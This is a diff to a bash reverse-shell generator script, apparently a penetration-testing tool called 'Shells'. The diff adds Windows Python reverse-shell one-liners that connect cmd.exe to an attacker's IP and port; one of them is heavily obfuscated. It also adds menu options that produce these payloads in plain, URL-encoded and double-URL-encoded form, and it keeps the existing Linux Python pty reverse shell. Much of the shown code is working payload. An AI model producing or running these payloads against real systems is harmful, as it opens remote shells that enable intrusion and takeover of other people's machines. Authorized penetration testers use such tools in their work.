@@ -1,7 +1,7 @@
 #!/bin/bash
 #By Andreas Finstad - 4ndr34z
 #Twitter handle: @4nqr34z
-#Shells v.1.2.9
+#Shells v.1.3
 
 ### Colors ##
 ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
@@ -481,6 +481,19 @@ then
 fi
 
 rev="$pythonv -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'"
+wrev2="python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('$IP', $PORT)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\""
+wrev3="python.exe -c \"import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('$IP',$PORT));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\\\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\\\",globals())).start()\""
+
+if [[ $1 == "wpython" ]] 
+
+then
+    rev=$wrev2
+
+elif [[ $1 == "wpython3" ]] 
+
+then
+    rev=$wrev3
+fi
 
 if [[ $2 == "url" ]] 
 
@@ -601,7 +614,7 @@ $(blueprint 'Listener')
 $(greenprint '1)') rlwrap netcat
 $(greenprint '2)') netcat
 $(greenprint '3)') no listener
-$(magentaprint '4)') Go Back to Main Menu
+$(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
 Choose an option [1]:  "
@@ -653,7 +666,7 @@ fi
     3)
         exit
         ;;
-    4)
+    m)
         mainmenu
         ;;
         
@@ -690,7 +703,7 @@ $(greenprint '1)') No encoding
 $(greenprint '2)') Base64 encoded
 $(greenprint '3)') URL encoded
 $(greenprint '4)') Double URL encoded
-$(magentaprint '5)') Go Back to Main Menu
+$(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
 Choose an option:  "
@@ -708,7 +721,7 @@ Choose an option:  "
     4)
         ruby "urlx2"
         ;;
-    5)
+    m)
         mainmenu
         ;;
     0)
@@ -733,7 +746,7 @@ $(greenprint '5)') system No encoding
 $(greenprint '6)') system Base64 encoded
 $(greenprint '7)') system URL encoded
 $(greenprint '8)') system Double URL encoded
-$(magentaprint '9)') Go Back to Main Menu
+$(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
 Choose an option:  "
@@ -763,7 +776,7 @@ Choose an option:  "
     8)
         php "urlx2" "system"
         ;;
-    9)
+    m)
         mainmenu
         ;;
     0)
@@ -785,7 +798,7 @@ $(greenprint '1)') No encoding
 $(greenprint '2)') Base64 encoded
 $(greenprint '3)') URL encoded
 $(greenprint '4)') Double URL encoded
-$(magentaprint '5)') Go Back to Main Menu
+$(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
 Choose an option:  "
@@ -803,7 +816,7 @@ Choose an option:  "
     4)
         telnet "urlx2"
         ;;
-    5)
+    m)
         mainmenu
         ;;
     0)
@@ -824,7 +837,7 @@ $(greenprint '1)') No encoding
 $(greenprint '2)') Base64 encoded
 $(greenprint '3)') URL encoded
 $(greenprint '4)') Double URL encoded
-$(magentaprint '5)') Go Back to Main Menu
+$(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
 Choose an option:  "
@@ -842,7 +855,7 @@ Choose an option:  "
     4)
         perl "urlx2"
         ;;
-    5)
+    m)
         mainmenu
         ;;
     0)
@@ -863,7 +876,7 @@ $(greenprint '1)') No encoding
 $(greenprint '2)') Base64 encoded
 $(greenprint '3)') URL encoded
 $(greenprint '4)') Double URL encoded
-$(magentaprint '5)') Go Back to Main Menu
+$(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
 Choose an option:  "
@@ -881,7 +894,7 @@ Choose an option:  "
     4)
         zsh "urlx2"
         ;;
-    5)
+    m)
         mainmenu
         ;;
     0)
@@ -903,7 +916,7 @@ $(greenprint '1)') No encoding
 $(greenprint '2)') Base64 encoded
 $(greenprint '3)') URL encoded
 $(greenprint '4)') Double URL encoded
-$(magentaprint '5)') Go Back to Main Menu
+$(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
 Choose an option:  "
@@ -921,7 +934,7 @@ Choose an option:  "
     4)
         bash_i "urlx2"
         ;;
-    5)
+    m)
         mainmenu
         ;;
     0)
@@ -946,7 +959,7 @@ $(greenprint '5)') Looping, no encoding
 $(greenprint '6)') Looping, Base64 encoded
 $(greenprint '7)') Looping, URL encoded
 $(greenprint '8)') Looping, double URL encoded
-$(magentaprint '9)') Go Back to Main Menu
+$(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
 Choose an option:  "
@@ -976,7 +989,7 @@ Choose an option:  "
     8)
         netcat "urlx2" "loop"
         ;;
-    9)
+    m)
         mainmenu
         ;;
     0)
@@ -998,11 +1011,17 @@ $(greenprint '3)') Python3 - Double URL encoded
 $(greenprint '4)') Python2 - No encoding
 $(greenprint '5)') Python2 - URL encoded
 $(greenprint '6)') Python2 - Double URL encoded
-$(magentaprint '7)') Go Back to Main Menu
+$(greenprint '7)') Windows Python3 - No encoding
+$(greenprint '8)') Windows Python3 - URL encoded
+$(greenprint '9)') Windows Python3 - Double URL encoded
+$(greenprint '10)') Windows Python2 - No encoding
+$(greenprint '11)') Windows Python2 - URL encoded
+$(greenprint '12)') Windows Python2 - Double URL encoded
+$(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
 
 Choose an option:  "
-    read -r -n 1 ans
+    read -r -n 2 ans
     case $ans in
     1)
         python "python3"
@@ -1023,6 +1042,24 @@ Choose an option:  "
         python "python" "urlx2"
         ;;
     7)
+        python "wpython3"
+        ;;
+    8)
+        python "wpython3" "url"
+        ;;
+    9)
+        python "wpython3" "urlx2"
+        ;;
+    10)
+        python "wpython" 
+        ;;
+    11)
+        python "wpython" "url"
+        ;;
+    12)
+        python "wpython" "urlx2"
+        ;;
+    m)
         mainmenu
         ;;
     0)
